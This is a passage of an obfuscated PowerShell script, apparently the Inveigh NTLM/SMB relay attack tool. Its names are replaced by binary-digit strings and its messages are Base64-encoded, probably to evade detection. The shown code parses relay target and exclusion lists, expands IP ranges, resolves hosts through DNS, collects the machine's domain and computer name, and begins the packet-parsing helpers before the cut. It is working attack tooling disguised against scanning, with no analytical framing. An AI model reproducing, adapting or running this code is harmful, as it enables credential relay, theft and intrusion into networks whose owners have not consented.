        ${00111011110000011} = New-Object System.Net.IPAddress (([System.Net.IPAddress]::parse($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA1ADUALgAyADUANQAuADIANQA1AC4AMgA1ADUA')))).address -bxor ${01011111100100100}.address -bor ${00110100110000100}.address))
    } 
    if(${_01010101101100010})
    { 
        ${00110111001010011} = _01001000001000000 -_01010101101100010 ${00110100110000100}.IPAddressToString
        ${01000000000001010} = _01001000001000000 -_01010101101100010 ${00111011110000011}.IPAddressToString
    }
    else
    { 
        ${00110111001010011} = _01001000001000000 -_01010101101100010 ${_01011000111110001} 
        ${01000000000001010} = _01001000001000000 -_01010101101100010 ${_10010100001111011} 
    } 
    for(${10000101000101100} = ${00110111001010011}; ${10000101000101100} -le ${01000000000001010}; ${10000101000101100}++) 
    { 
        ${01110100111010000} = _01000110000100010 -_00101110010010011 ${10000101000101100}
        ${10001101011011001}.Add(${01110100111010000}) > $null
    }
    if(${00110100110000100})
    {
        ${10001101011011001}.Remove(${00110100110000100}.IPAddressToString)
    }
    if(${00111011110000011})
    {
        ${10001101011011001}.Remove(${00111011110000011}.IPAddressToString)
    }
    return ${10001101011011001}
}
function _10110100111101000
{
    param(${_01111001000100001})
    ${10001101011011001} = New-Object System.Collections.ArrayList
    for(${10000101000101100}=0;${10000101000101100} -lt ${_01111001000100001}.Count;${10000101000101100}++)
    {
        if(${_01111001000100001}[${10000101000101100}] -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAtACoA'))))
        {
            ${01100111010000001} = ${_01111001000100001}[${10000101000101100}].split("-")
            if(${01100111010000001}[0] -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABiACgAPwA6ACgAPwA6ADIANQBbADAALQA1AF0AfAAyAFsAMAAtADQAXQBbADAALQA5AF0AfABbADAAMQBdAD8AWwAwAC0AOQBdAFsAMAAtADkAXQA/ACkAXAAuACkAewAzAH0AKAA/ADoAMgA1AFsAMAAtADUAXQB8ADIAWwAwAC0ANABdAFsAMAAtADkAXQB8AFsAMAAxAF0APwBbADAALQA5AF0AWwAwAC0AOQBdAD8AKQBcAGIA'))) -and
            ${01100111010000001}[1] -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABiACgAPwA6ACgAPwA6ADIANQBbADAALQA1AF0AfAAyAFsAMAAtADQAXQBbADAALQA5AF0AfABbADAAMQBdAD8AWwAwAC0AOQBdAFsAMAAtADkAXQA/ACkAXAAuACkAewAzAH0AKAA/ADoAMgA1AFsAMAAtADUAXQB8ADIAWwAwAC0ANABdAFsAMAAtADkAXQB8AFsAMAAxAF0APwBbADAALQA5AF0AWwAwAC0AOQBdAD8AKQBcAGIA'))))
            {
                if(${01100111010000001}.Count -ne 2 -or ${01100111010000001}[1] -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbAFwAZABdACsAJAA='))) -or ${01100111010000001}[1] -gt 254)
                {
                    echo "[!] Invalid target $($target[${10000101000101100}])"
                    throw
                }
                else
                {
                    ${10100100000000000} = ${01100111010000001}[0].ToCharArray()
                    [Array]::Reverse(${10100100000000000})
                    ${10100100000000000} = -join(${10100100000000000})
                    ${10100100000000000} = ${10100100000000000}.SubString(${10100100000000000}.IndexOf("."))
                    ${10100100000000000} = ${10100100000000000}.ToCharArray()
                    [Array]::Reverse(${10100100000000000})
                    ${10100100000000000} = -join(${10100100000000000})
                    ${10110110111111100} = ${10100100000000000} + ${01100111010000001}[1]
                    ${_01111001000100001}[${10000101000101100}] = ${01100111010000001}[0] + "-" + ${10110110111111100}
                }
            }
        }
    }
    ForEach(${01000101011101100} in ${_01111001000100001})
    {
        ${10111001001010010} = $null
        if(${01000101011101100}.contains("/"))
        {
            ${10111001001010010} = ${01000101011101100}.Split("/")
            ${_01010101101100010} = ${10111001001010010}[0]
            ${_10111100111100101} = ${10111001001010010}[1]
            [Array]${10101101000111011} = _10010110010010101 -_01010101101100010 ${_01010101101100010} -_10111100111100101 ${_10111100111100101}
            ${10001101011011001}.AddRange(${10101101000111011})
        }
        elseif(${01000101011101100}.contains("-"))
        {
            ${10111001001010010} = ${01000101011101100}.Split("-")
            if(${10111001001010010}[0] -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABiACgAPwA6ACgAPwA6ADIANQBbADAALQA1AF0AfAAyAFsAMAAtADQAXQBbADAALQA5AF0AfABbADAAMQBdAD8AWwAwAC0AOQBdAFsAMAAtADkAXQA/ACkAXAAuACkAewAzAH0AKAA/ADoAMgA1AFsAMAAtADUAXQB8ADIAWwAwAC0ANABdAFsAMAAtADkAXQB8AFsAMAAxAF0APwBbADAALQA5AF0AWwAwAC0AOQBdAD8AKQBcAGIA'))) -and
            ${10111001001010010}[1] -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABiACgAPwA6ACgAPwA6ADIANQBbADAALQA1AF0AfAAyAFsAMAAtADQAXQBbADAALQA5AF0AfABbADAAMQBdAD8AWwAwAC0AOQBdAFsAMAAtADkAXQA/ACkAXAAuACkAewAzAH0AKAA/ADoAMgA1AFsAMAAtADUAXQB8ADIAWwAwAC0ANABdAFsAMAAtADkAXQB8AFsAMAAxAF0APwBbADAALQA5AF0AWwAwAC0AOQBdAD8AKQBcAGIA'))))
            {
                ${00110111001010011} = ${10111001001010010}[0]
                ${01000000000001010} = ${10111001001010010}[1]
                [Array]${10101101000111011} = _10010110010010101 -_01011000111110001 ${00110111001010011} -_10010100001111011 ${01000000000001010}
                ${10001101011011001}.AddRange(${10101101000111011})
            }
            else
            {
                ${10001101011011001}.Add(${01000101011101100}) > $null    
            }
        }
        else
        {
            ${10001101011011001}.Add(${01000101011101100}) > $null
        }
    }
    return ${10001101011011001}
}
if($Target)
{
    if($Target.Count -eq 1)
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAbABhAHkAIABUAGEAcgBnAGUAdAAgAD0AIAA='))) + ($Target -join ",")) > $null
    }
    elseif($Target.Count -gt 3)
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAbABhAHkAIABUAGEAcgBnAGUAdABzACAAPQAgAA=='))) + ($Target[0..2] -join ",") + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAuAC4A')))) > $null
    }
    else
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAbABhAHkAIABUAGEAcgBnAGUAdABzACAAPQAgAA=='))) + ($Target -join ",")) > $null
    }
    ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAGEAcgBzAGkAbgBnACAAUgBlAGwAYQB5ACAAVABhAHIAZwBlAHQAIABMAGkAcwB0AA==')))) > $null
    ${10001101011100010}.target_list = New-Object System.Collections.ArrayList
    [Array]${10101101000111011} = _10110100111101000 $Target
    ${10001101011100010}.target_list.AddRange(${10101101000111011})
}
if($TargetExclude)
{
    if($TargetExclude.Count -eq 1)
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAbABhAHkAIABUAGEAcgBnAGUAdAAgAEUAeABjAGwAdQBkAGUAIAA9ACAA'))) + ($TargetExclude -join ",")) > $null
    }
    elseif($TargetExclude.Count -gt 3)
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAbABhAHkAIABUAGEAcgBnAGUAdABzACAARQB4AGMAbAB1AGQAZQAgAD0AIAA='))) + ($TargetExclude[0..2] -join ",") + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAuAC4A')))) > $null
    }
    else
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAbABhAHkAIABUAGEAcgBnAGUAdABzACAARQB4AGMAbAB1AGQAZQAgAD0AIAA='))) + ($TargetExclude -join ",")) > $null
    }
    ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAGEAcgBzAGkAbgBnACAAUgBlAGwAYQB5ACAAVABhAHIAZwBlAHQAIABFAHgAYwBsAHUAZABlACAATABpAHMAdAA=')))) > $null
    ${10001101011100010}.target_exclude_list = New-Object System.Collections.ArrayList
    [Array]${10101101000111011} = _10110100111101000 $TargetExclude
    ${10001101011100010}.target_exclude_list.AddRange($TargetExclude)
}
if($Username)
{
    if($Username.Count -eq 1)
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAbABhAHkAIABVAHMAZQByAG4AYQBtAGUAIAA9ACAA'))) + ($Username -join ",")) > $null
    }
    else
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAbABhAHkAIABVAHMAZQByAG4AYQBtAGUAcwAgAD0AIAA='))) + ($Username -join ",")) > $null
    }
}
if($RelayAutoDisable -eq 'Y')
{
    ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAbABhAHkAIABBAHUAdABvACAARABpAHMAYQBiAGwAZQAgAD0AIABFAG4AYQBiAGwAZQBkAA==')))) > $null
}
else
{
    ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAbABhAHkAIABBAHUAdABvACAARABpAHMAYQBiAGwAZQAgAD0AIABEAGkAcwBhAGIAbABlAGQA')))) > $null
}
if($RelayAutoExit -eq 'Y')
{
    ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAbABhAHkAIABBAHUAdABvACAARQB4AGkAdAAgAD0AIABFAG4AYQBiAGwAZQBkAA==')))) > $null
}
else
{
    ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAbABhAHkAIABBAHUAdABvACAARQB4AGkAdAAgAD0AIABEAGkAcwBhAGIAbABlAGQA')))) > $null
}
if($Service)
{
    ${10001101011100010}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAbABhAHkAIABTAGUAcgB2AGkAYwBlACAAPQAgACQAUwBlAHIAdgBpAGMAZQA=')))) > $null
}
if($ConsoleOutput -ne 'N')
{
    if($ConsoleOutput -eq 'Y')
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAYQBsACAAVABpAG0AZQAgAEMAbwBuAHMAbwBsAGUAIABPAHUAdABwAHUAdAAgAD0AIABFAG4AYQBiAGwAZQBkAA=='))))  > $null
    }
    else
    {
        ${10001101011100010}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAYQBsACAAVABpAG0AZQAgAEMAbwBuAHMAbwBsAGUAIABPAHUAdABwAHUAdAAgAD0AIAAkAEMAbwBuAHMAbwBsAGUATwB1AHQAcAB1AHQA'))))  > $null
    }
    ${10001101011100010}.console_output = $true
    if($ConsoleStatus -eq 1)
    {
        ${10001101011100010}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAG8AbgBzAG8AbABlACAAUwB0AGEAdAB1AHMAIAA9ACAAJABDAG8AbgBzAG8AbABlAFMAdABhAHQAdQBzACAATQBpAG4AdQB0AGUA'))))  > $null
    }
    elseif($ConsoleStatus -gt 1)
    {
        ${10001101011100010}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAG8AbgBzAG8AbABlACAAUwB0AGEAdAB1AHMAIAA9ACAAJABDAG8AbgBzAG8AbABlAFMAdABhAHQAdQBzACAATQBpAG4AdQB0AGUAcwA='))))  > $null
    }
}
else
{
    if(${10001101011100010}.tool -eq 1)
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABSAGUAYQBsACAAVABpAG0AZQAgAEMAbwBuAHMAbwBsAGUAIABPAHUAdABwAHUAdAAgAEQAaQBzAGEAYgBsAGUAZAAgAEQAdQBlACAAVABvACAARQB4AHQAZQByAG4AYQBsACAAVABvAG8AbAAgAFMAZQBsAGUAYwB0AGkAbwBuAA==')))) > $null
    }
    else
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAYQBsACAAVABpAG0AZQAgAEMAbwBuAHMAbwBsAGUAIABPAHUAdABwAHUAdAAgAD0AIABEAGkAcwBhAGIAbABlAGQA')))) > $null
    }
}
if($ConsoleUnique -eq 'Y')
{
    ${10001101011100010}.console_unique = $true
}
else
{
    ${10001101011100010}.console_unique = $false
}
if($FileOutput -eq 'Y')
{
    ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAYQBsACAAVABpAG0AZQAgAEYAaQBsAGUAIABPAHUAdABwAHUAdAAgAD0AIABFAG4AYQBiAGwAZQBkAA==')))) > $null
    ${10001101011100010}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABPAHUAdABwAHUAdAAgAEQAaQByAGUAYwB0AG8AcgB5ACAAPQAgACQAewAwADEAMAAwADEAMAAxADEAMAAwADEAMQAxADEAMQAwADEAfQA=')))) > $null
    ${10001101011100010}.file_output = $true
}
else
{
    ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAYQBsACAAVABpAG0AZQAgAEYAaQBsAGUAIABPAHUAdABwAHUAdAAgAD0AIABEAGkAcwBhAGIAbABlAGQA')))) > $null
}
if($FileUnique -eq 'Y')
{
    ${10001101011100010}.file_unique = $true
}
else
{
    ${10001101011100010}.file_unique = $false
}
if($LogOutput -eq 'Y')
{
    ${10001101011100010}.log_output = $true
}
else
{
    ${10001101011100010}.log_output = $false
}
if($RunTime -eq 1)
{
    ${10001101011100010}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAHUAbgAgAFQAaQBtAGUAIAA9ACAAJABSAHUAbgBUAGkAbQBlACAATQBpAG4AdQB0AGUA')))) > $null
}
elseif($RunTime -gt 1)
{
    ${10001101011100010}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAHUAbgAgAFQAaQBtAGUAIAA9ACAAJABSAHUAbgBUAGkAbQBlACAATQBpAG4AdQB0AGUAcwA=')))) > $null
}
if($ShowHelp -eq 'Y')
{
    ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABSAHUAbgAgAFMAdABvAHAALQBJAG4AdgBlAGkAZwBoACAAdABvACAAcwB0AG8AcAA=')))) > $null
    if(${10001101011100010}.console_output)
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAHIAZQBzAHMAIABhAG4AeQAgAGsAZQB5ACAAdABvACAAcwB0AG8AcAAgAGMAbwBuAHMAbwBsAGUAIABvAHUAdABwAHUAdAA=')))) > $null
    }
}
while(${10001101011100010}.output_queue.Count -gt 0)
{
    switch -Wildcard (${10001101011100010}.output_queue[0])
    {
        {$_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PwBbACEAXQAqAA=='))) -or $_ -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PwBbAC0AXQAqAA==')))}
        {
            if(${10001101011100010}.status_output -and ${10001101011100010}.output_stream_only)
            {
                echo(${10001101011100010}.output_queue[0] + ${10001101011100010}.newline)
            }
            elseif(${10001101011100010}.status_output)
            {
                Write-Warning(${10001101011100010}.output_queue[0])
            }
            if(${10001101011100010}.file_output)
            {
                ${10001101011100010}.log_file_queue.Add(${10001101011100010}.output_queue[0]) > $null
            }
            if(${10001101011100010}.log_output)
            {
                ${10001101011100010}.log.Add(${10001101011100010}.output_queue[0]) > $null
            }
            ${10001101011100010}.output_queue.RemoveAt(0)
        }
        default
        {
            if(${10001101011100010}.status_output -and ${10001101011100010}.output_stream_only)
            {
                echo(${10001101011100010}.output_queue[0] + ${10001101011100010}.newline)
            }
            elseif(${10001101011100010}.status_output)
            {
                echo(${10001101011100010}.output_queue[0])
            }
            if(${10001101011100010}.file_output)
            {
                if (${10001101011100010}.output_queue[0].StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIAA=')))) -or ${10001101011100010}.output_queue[0].StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIAA=')))))
                {
                    ${10001101011100010}.log_file_queue.Add(${10001101011100010}.output_queue[0]) > $null
                }
                else
                {
                    ${10001101011100010}.log_file_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwByAGUAZABhAGMAdABlAGQAXQA=')))) > $null    
                }
            }
            if(${10001101011100010}.log_output)
            {
                ${10001101011100010}.log.Add(${10001101011100010}.output_queue[0]) > $null
            }
            ${10001101011100010}.output_queue.RemoveAt(0)
        }
    }
}
if(!${10001101011100010}.netBIOS_domain)
{
    ${10001101011100010}.status_output = $false
    ${10001101011100010}.netBIOS_domain = (ls -path env:userdomain).Value
    ${10001101011100010}.computer_name = (ls -path env:computername).Value
    try
    {
        ${10001101011100010}.DNS_domain = ((ls -path env:userdnsdomain -ErrorAction $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))).Value).ToLower()
        ${10001101011100010}.DNS_computer_name = (${10001101011100010}.computer_name + "." + ${10001101011100010}.DNS_domain).ToLower()
        if(!${10001101011100010}.domain_mapping_table.ContainsKey(${10001101011100010}.netBIOS_domain))
        {
            ${10001101011100010}.domain_mapping_table.Add(${10001101011100010}.netBIOS_domain,${10001101011100010}.DNS_domain)
        }
    }
    catch
    {
        ${10001101011100010}.DNS_domain = ${10001101011100010}.netBIOS_domain
        ${10001101011100010}.DNS_computer_name = ${10001101011100010}.computer_name
    }
}
else
{
    if(!${10001101011100010}.domain_mapping_table.ContainsKey(${10001101011100010}.netBIOS_domain))
    {
        ${10001101011100010}.domain_mapping_table.Add(${10001101011100010}.netBIOS_domain,${10001101011100010}.DNS_domain)
    }
}
if(${10001101011100010}.enumerate)
{
    ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAGUAcgBmAG8AcgBtAGkAbgBnACAARABOAFMAIABvAG4AIABpAG0AcABvAHIAdABlAGQAIAB0AGEAcgBnAGUAdABzAA==')))) > $null
    for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
    {
        if(${10001101011100010}.enumerate[${10000101000101100}].Hostname -and !${10001101011100010}.enumerate[${10000101000101100}].IP -and ${10001101011100010}.enumerate[${10000101000101100}]."DNS Record" -ne $false)
        {
            ${00111101100111111} = $true
            try
            {
                ${01000100001111101} = [System.Net.Dns]::GetHostEntry(${10001101011100010}.enumerate[${10000101000101100}].Hostname)
                foreach(${01000101011101100} in ${01000100001111101}.AddressList)
                {
                    if(${01000101011101100}.AddressFamily -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAE4AZQB0AHcAbwByAGsA'))))
                    {
                        ${10001101011100010}.enumerate[${10000101000101100}].IP = ${01000101011101100}.IPAddressToString
                        ${10001101011100010}.enumerate[${10000101000101100}]."DNS Record" = $true
                        ${10001101011100010}.enumerate[${10000101000101100}]."IPv6 Only" = $false
                        ${00001100010111011} = $true
                    }
                }
                if(!${00001100010111011})
                {
                    ${10001101011100010}.output_queue.Add("[-] [$(Get-Date -format s)] IPv6 target $(${10001101011100010}.enumerate[${10000101000101100}].Hostname) not supported") > $null
                    ${10001101011100010}.enumerate[${10000101000101100}]."IPv6 Only" = $true
                }
            }
            catch
            {
                ${10001101011100010}.output_queue.Add("[-] [$(Get-Date -format s)] DNS lookup for $(${10001101011100010}.enumerate[${10000101000101100}].Hostname) failed") > $null
                ${10001101011100010}.enumerate[${10000101000101100}]."DNS Record" = $false
            }
            ${00001100010111011} = $false
            ${01000100001111101} = $null
        }
    }
    if(${00111101100111111})
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABEAE4AUwAgAGwAbwBvAGsAdQBwAHMAIABjAG8AbQBwAGwAZQB0AGUA')))) > $null
        ${00111101100111111} = $false
    }
    else
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABOAG8AIABEAE4AUwAgAGwAbwBvAGsAdQBwAHMAIAByAGUAcQB1AGkAcgBlAGQA')))) > $null
    }
}
if(${10001101011100010}.target_list)
{
    ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAGUAcgBmAG8AcgBtAGkAbgBnACAARABOAFMAIABsAG8AbwBrAHUAcABzACAAbwBuACAAdABhAHIAZwBlAHQAIABsAGkAcwB0AA==')))) > $null
    for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.target_list.Count;${10000101000101100}++)
    {
        if(!(${10001101011100010}.target_list[${10000101000101100}] -as [IPAddress] -as [Bool]))
        {
            ${00111101100111111} = $true
            try
            {
                ${01000100001111101} = [System.Net.Dns]::GetHostEntry(${10001101011100010}.target_list[${10000101000101100}])
                foreach(${01000101011101100} in ${01000100001111101}.AddressList)
                {
                    if(${01000101011101100}.AddressFamily -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAE4AZQB0AHcAbwByAGsA'))))
                    {
                        ${10001101011100010}.target_list[${10000101000101100}] = ${01000101011101100}.IPAddressToString
                        ${01110100011110101} = $true
                    }
                    if(!${01110100011110101})
                    {
                        ${10001101011100010}.output_queue.Add("[-] [$(Get-Date -format s)] IPv6 target $(${10001101011100010}.target_list[${10000101000101100}]) not supported") > $null
                        ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Removed $(${10001101011100010}.target_list[${10000101000101100}]) from target list") > $null
                        ${10001101011100010}.target_list.RemoveAt(${10000101000101100})
                        ${10000101000101100} -= 1
                    }
                }
            }
            catch
            {
                ${10001101011100010}.output_queue.Add("[-] [$(Get-Date -format s)] DNS lookup for $(${10001101011100010}.target_list[${10000101000101100}]) failed") > $null
                ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Removed $(${10001101011100010}.target_list[${10000101000101100}]) from target list") > $null
                ${10001101011100010}.target_list.RemoveAt(${10000101000101100})
                ${10000101000101100} -= 1
            }
            ${01110100011110101} = $false
            ${01000100001111101} = $null
        }
    }
    if(${00111101100111111})
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABEAE4AUwAgAGwAbwBvAGsAdQBwAHMAIABvAG4AIABjAG8AbQBwAGwAZQB0AGUA')))) > $null
        ${00111101100111111} = $false
    }
    else
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABOAG8AIABEAE4AUwAgAGwAbwBvAGsAdQBwAHMAIAByAGUAcQB1AGkAcgBlAGQA')))) > $null
    }
}
if(${10001101011100010}.target_exclude_list)
{
    ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAGUAcgBmAG8AcgBtAGkAbgBnACAARABOAFMAIABsAG8AbwBrAHUAcABzACAAbwBuACAAZQB4AGMAbAB1AGQAZQBkACAAdABhAHIAZwBlAHQAcwAgAGwAaQBzAHQA')))) > $null
    for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.target_exclude_list.Count;${10000101000101100}++)
    {
        if(!(${10001101011100010}.target_exclude_list[${10000101000101100}] -as [IPAddress] -as [Bool]))
        {
            ${00111101100111111} = $true
            try
            {
                ${01000100001111101} = [System.Net.Dns]::GetHostEntry(${10001101011100010}.target_exclude_list[${10000101000101100}])
                foreach(${01000101011101100} in ${01000100001111101}.AddressList)
                {
                    if(${01000101011101100}.AddressFamily -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAE4AZQB0AHcAbwByAGsA'))))
                    {
                        ${10001101011100010}.target_exclude_list[${10000101000101100}] = ${01000101011101100}.IPAddressToString
                        ${10010011110001000} = $true
                    }
                }
                if(!${10010011110001000})
                {
                    ${10001101011100010}.output_queue.Add("[-] [$(Get-Date -format s)] IPv6 target $(${10001101011100010}.target_list[${10000101000101100}]) not supported") > $null
                    ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Removed $(${10001101011100010}.target_exclude_list[${10000101000101100}]) from exclusion list") > $null
                    ${10001101011100010}.target_exclude_list.RemoveAt(${10000101000101100})
                    ${10000101000101100} -= 1
                }
            }
            catch
            {
                ${10001101011100010}.output_queue.Add("[-] [$(Get-Date -format s)] DNS lookup for $(${10001101011100010}.target_exclude_list[${10000101000101100}]) failed") > $null
                ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Removed $(${10001101011100010}.target_exclude_list[${10000101000101100}]) from exclusion list") > $null
                ${10001101011100010}.target_exclude_list.RemoveAt(${10000101000101100})
                ${10000101000101100} -= 1
            }
            ${10010011110001000} = $false
            ${01000100001111101} = $null
        }
    }
    if(${00111101100111111})
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABEAE4AUwAgAGwAbwBvAGsAdQBwAHMAIABjAG8AbQBwAGwAZQB0AGUA')))) > $null
        ${00111101100111111} = $false
    }
    else
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABOAG8AIABEAE4AUwAgAGwAbwBvAGsAdQBwAHMAIAByAGUAcQB1AGkAcgBlAGQA')))) > $null
    }
}
if(${10001101011100010}.target_list -and ${10001101011100010}.target_exclude_list)
{
    ${10001101011100010}.target_list = diff -ReferenceObject ${10001101011100010}.target_exclude_list -DifferenceObject ${10001101011100010}.target_list | ? {$_.sideIndicator -eq "=>"} | % {$_.InputObject}
}
if(!${10001101011100010}.target_list -and !${10001101011100010}.enumerated)
{
    ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Disabling relay due empty target list") > $null
    ${10001101011100010}.SMB_relay = $false
}
${10001101011100010}.status_output = $false
${00001111001001001} =
{
    function _01100110110110101
    {
        param ([Int]${_01011000111110001},[Byte[]]${_00101101100100001})
        ${00110010100000110} = [System.BitConverter]::ToUInt16(${_00101101100100001}[${_01011000111110001}..(${_01011000111110001} + 1)],0)
        return ${00110010100000110}
    }
    function _10111011101101011
    {
        param ([Int]${_01011000111110001},[Byte[]]${_00101101100100001})
        ${00110010100000110} = [System.BitConverter]::ToUInt32(${_00101101100100001}[${_01011000111110001}..(${_01011000111110001} + 3)],0)
        return ${00110010100000110}
    }
    function _10110010000011111
    {
        param ([Int]${_01011000111110001},[Int]${_00000000001100111},[Byte[]]${_00101101100100001})
        ${10000000011010001} = [System.BitConverter]::ToString(${_00101101100100001}[${_01011000111110001}..(${_01011000111110001} + ${_00000000001100111} - 1)])
        ${10000000011010001} = ${10000000011010001} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
        ${10000000011010001} = ${10000000011010001}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${10011011010000011} = New-Object System.String (${10000000011010001},0,${10000000011010001}.Length)
        return ${10011011010000011}
    }
    function _00000101010001111
    {
        param (${_01010101101100010},${_00001010101100110},${_10011000100101010},${_10000111000010100},$Sessions,${_00100011111011111},${_10011010010000101},
            ${_00001100111111000},${_00111000111111110},${_10100000011010100},${_10100110000001110},${_01111001100111010},${_10111010111010111},${_01011000111001010},${_01000101110000111},${_01101010001110010},
            ${_10100010110001101},${_00110000101101110},$Enumerate,${_10110111010110100})
        if($Sessions -and $Sessions -isnot [Array]){$Sessions = @($Sessions)}
        if(${_00100011111011111} -and ${_00100011111011111} -isnot [Array]){${_00100011111011111} = @(${_00100011111011111})}
        if(${_10011010010000101} -and ${_10011010010000101} -isnot [Array]){${_10011010010000101} = @(${_10011010010000101})}
        if(${_00001100111111000} -and ${_00001100111111000} -isnot [Array]){${_00001100111111000} = @(${_00001100111111000})}
        if(${_00111000111111110} -and ${_00111000111111110} -isnot [Array]){${_00111000111111110} = @(${_00111000111111110})}
        if(${_10100000011010100} -and ${_10100000011010100} -isnot [Array]){${_10100000011010100} = @(${_10100000011010100})}
        if(${_10100110000001110} -and ${_10100110000001110} -isnot [Array]){${_10100110000001110} = @(${_10100110000001110})}
